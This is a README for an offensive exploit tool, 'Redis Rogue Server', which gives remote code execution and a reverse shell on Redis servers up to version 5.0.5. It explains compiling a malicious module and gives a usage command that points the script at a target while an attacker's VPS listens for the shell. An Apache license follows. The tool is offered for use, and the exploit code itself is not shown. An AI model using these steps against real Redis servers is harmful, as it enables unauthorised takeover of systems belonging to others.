# Redis Rogue Server

A exploit for Redis(<=5.0.5) RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

__Support interactive shell and reverse shell!__

## Usage:

Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

Copy the .so file to same folder with `redis-rogue-server.py`.

Run the rogue server:

```
python3 redis-rogue-server.py \
    --rhost <target address> \
    --rport <target port> \
    --lhost <vps address> \
    --lport <vps port>
```

The default target port is 6379 and the default vps port is 21000.

## LICENSE
```
Copyright [2019] [n0b0dy]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
